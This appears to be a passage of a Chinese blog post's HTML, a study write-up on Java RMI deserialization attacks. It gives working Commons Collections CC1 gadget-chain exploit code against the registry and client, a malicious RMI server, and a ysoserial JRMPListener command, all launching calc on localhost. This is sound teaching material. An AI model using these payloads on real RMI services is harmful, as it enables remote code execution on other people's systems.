class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//通过反射拿到 UnicastRef</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) field.get(registry);<br><br>        <span class="hljs-comment">//从这里开始模拟 lookup 的方式进行伪造方法调用</span><br>        <span class="hljs-comment">//这里手动构建了一次 Registry 远程调用</span><br>        Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-comment">//获取调用的输出流</span><br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        <span class="hljs-comment">//序列化</span><br>        var3.writeObject(CC1());<br>        <span class="hljs-comment">//这里执行远程调用触发漏洞</span><br>        ref.invoke(var2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="4-2-攻击客户端"><a href="#4-2-攻击客户端" class="headerlink" title="4.2 攻击客户端"></a>4.2 攻击客户端</h3><h4 id="4-2-1-注册中心攻击客户端"><a href="#4-2-1-注册中心攻击客户端" class="headerlink" title="4.2.1 注册中心攻击客户端"></a>4.2.1 注册中心攻击客户端</h4><blockquote>
+<p>除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#39;calc&#39;</code></p>
+<p>客户端去访问：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        registry.list();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>但是运行完什么都没有发生。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="后续发现俩个问题，"><a href="#后续发现俩个问题，" class="headerlink" title="后续发现俩个问题，"></a>后续发现俩个问题，</h5><h6 id="一是-Java-版本"><a href="#一是-Java-版本" class="headerlink" title="一是 Java 版本"></a>一是 Java 版本</h6><p>如果是用CC1链，Java版本低于 1.8.0_65</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，高版本可以用 CC6 链绕过也是可以的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="二是运行计算器时因为加了-单引号-‘’-而找不到程序"><a href="#二是运行计算器时因为加了-单引号-‘’-而找不到程序" class="headerlink" title="二是运行计算器时因为加了 单引号 ‘’ 而找不到程序"></a>二是运行计算器时因为加了 单引号 ‘’ 而找不到程序</h6><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行 <code>calc</code> <code>&quot;calc&quot;</code> 都可以正常弹出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="4-2-2-服务端攻击客户端"><a href="#4-2-2-服务端攻击客户端" class="headerlink" title="4.2.2 服务端攻击客户端"></a>4.2.2 服务端攻击客户端</h4><p>服务端攻击客户端，可分俩种情形：</p>
+<ol>
+<li><font style="color:rgb(80, 80, 92);">服务端返回Object对象</font></li>
+<li><font style="color:rgb(80, 80, 92);">远程加载对象</font></li>
+</ol>
+<h5 id="服务端返回Object对象"><a href="#服务端返回Object对象" class="headerlink" title="服务端返回Object对象"></a><font style="color:rgb(80, 80, 92);">服务端返回Object对象</font></h5><p>RMI 远程方法调用返回的不一定是一个基础数据类型（比如String  int），也会返回一个对象。服务端返回给客户端一个对象，客户端要对这个对象反序列化。所以我们伪造一个服务端，当客户端调用某个方法时，返回的就是恶意对象，就可以攻击客户端。</p>
+<p>User 接口，返回 Object 对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.rmi.Remote &#123;<br>    Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>服务端实现 User 接口，返回 CC1 恶意 Object 对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerReturnObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>  &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerReturnObject</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">return</span> handler;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>恶意服务端将恶意对象注册到注册中心</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>客户端获取恶意对象，调用 getUser() 方法，反序列化恶意远程对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)registry.lookup(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png" srcset="/img/loading.gif" lazyload>			</p>
+<h5 id="远程加载对象"><a href="#远程加载对象" class="headerlink" title="远程加载对象"></a><font style="color:rgb(80, 80, 92);">远程加载对象</font></h5><blockquote>
+<p>《Java 安全漫谈》</p>
+<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的</p>
+<p>CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
+<p>如果我们指定 codebase&#x3D;<a target="_blank" rel="noopener" href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则</p>
+<p>Java虚拟机会下载这个文件 <a target="_blank" rel="noopener" href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为</p>
+<p>Example类的字节码。</p>
+<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻</p>
+<p>找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在</p>
+<p>本地没有找到这个类，就会去远程加载codebase中的类。</p>
+<p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p>
+<p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去</p>
+<p>CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
+<p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p>
+<ul>
+<li>安装并配置了SecurityManager</li>
+<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly&#x3D;false</li>
+</ul>
+<p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p>
+<p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</p>
+</blockquote>
+<h3 id="4-3-攻击服务端"><a href="#4-3-攻击服务端" class="headerlink" title="4.3 攻击服务端"></a>4.3 攻击服务端</h3><p>这一部分同样是熟悉的 unmarshalValue ,</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化</strong></p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>官方文档</p>
+<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p>
+<p><font style="color:rgb(34, 34, 38);">从懵逼到恍然大悟之Java中RMI的使用</font></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lmy86263/article/details/72594760">https://blog.csdn.net/lmy86263/article/details/72594760</a></p>
+<p><font style="color:rgb(51, 51, 51);">JAVA安全基础（四）– RMI机制</font></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8760">https://xz.aliyun.com/news/8760</a></p>
+<p><font style="color:rgb(68, 68, 68);">一文回顾攻击Java RMI方式</font></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263726#h2-5">https://www.anquanke.com/post/id/263726#h2-5</a></p>
+<p>Java RMI 攻击由浅入深</p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pihaochen/p/11020596.html"><font style="color:rgb(89, 182, 215);">https://www.cnblogs.com/pihaochen/p/11020596.html</font></a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9053"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/9053</font></a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7930"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7930</font></a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6660"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/6660</font></a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7079</font></a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java-%E5%AD%A6%E4%B9%A0/" class="print-no-link">#java 学习</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RMI</div>
+      <div>http://xvshifu.github.io/2025/09/20/RMI/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/09/24/JNDI/" title="JNDI">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JNDI</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/02/CC4_CC2_CC5_CC7/" title="CC4_CC2_CC5_CC7">
+                        <span class="hidden-mobile">CC4_CC2_CC5_CC7</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
